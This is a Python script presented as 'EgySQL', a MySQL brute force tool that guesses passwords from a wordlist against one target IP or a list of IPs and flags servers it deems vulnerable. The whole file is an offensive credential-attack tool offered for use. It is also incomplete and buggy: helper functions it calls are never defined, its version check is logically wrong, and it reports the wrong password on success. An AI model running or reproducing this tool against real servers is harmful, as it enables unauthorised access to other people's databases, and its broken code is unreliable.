import socket
import pymysql
import re
from concurrent.futures import ThreadPoolExecutor
from pymysql import MySQLError

def check_mysql_port_open(host, port=3306):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except (socket.timeout, ConnectionRefusedError):
        return False

def get_mysql_version(host, username, password):
    try:
        with pymysql.connect(host=host, user=username, password=password, port=3306, connect_timeout=2) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT VERSION()")
            version = cursor.fetchone()[0]
            cursor.close()
            return version
    except MySQLError:
        return None

def is_vulnerable_mysql(version):
    vulnerable_version_pattern = re.compile(r'(\d+)\.(\d+)\.(\d+)')
    match = vulnerable_version_pattern.match(version)
    if match:
        major = int(match.group(1))
        minor = int(match.group(2))
        patch = int(match.group(3))
        if major <= 5 and minor <= 7 and patch <= 32:
            return True
    return False

def execute_mysql_bruteforce(host, username, password):
    if not check_mysql_port_open(host):
        return False

    try:
        with pymysql.connect(host=host, user=username, password=password, port=3306, connect_timeout=2) as conn:
            version = get_mysql_version(host, username, password)
            if version and is_vulnerable_mysql(version):
                print(f"[!] WARNING: MySQL server {host} is vulnerable to known exploits!")

            # Save successful attempt to the text file or database
            save_successful_attempt('MySQL', host, username, password)
            return True
    except MySQLError:
        return False

def bruteforce_mysql(host, username, password_list):
    if not password_list:
        print("[-] Error: No passwords provided.")
        return

    if not check_mysql_port_open(host):
        print(f"[-] Failed to connect to {host}:3306. Make sure MySQL service is running.")
        return

    max_workers = min(10, len(password_list))

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for password in password_list:
            futures.append(executor.submit(execute_mysql_bruteforce, host, username, password))
        
        for future in futures:
            if future.result():
                print(f"[+] Successfully logged in to MySQL on {host} with credentials: {username}:{password}")
                return

    print("[!] Brute force attempt unsuccessful. Password not found.")

def main():
    print("Welcome to EgySQL - MySQL Brute Force Tool")
    print("AliElTop 4.0")

    while True:
        print("\nChoose an option:")
        print("1. Scan MySQL service on a single IP")
        print("2. Scan MySQL service on multiple IPs from list")
        print("Q. Quit")

        choice = input("Enter your choice: ")

        if choice == '1':
            ip = input("Enter the target IP: ")
            username = input("Enter the target username: ")
            password_list_path = input("Enter the password list file path: ")
            password_list = read_passwords_from_file(password_list_path)
            bruteforce_mysql(ip, username, password_list)
        elif choice == '2':
            ips = get_ips_or_users_from_list(is_ip=True)
            username = input("Enter the target username: ")
            password_list_path = input("Enter the password list file path: ")
            password_list = read_passwords_from_file(password_list_path)
            for ip in ips:
                bruteforce_mysql(ip, username, password_list)
        elif choice.lower() == 'q':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Try again...")

if __name__ == "__main__":
    main()
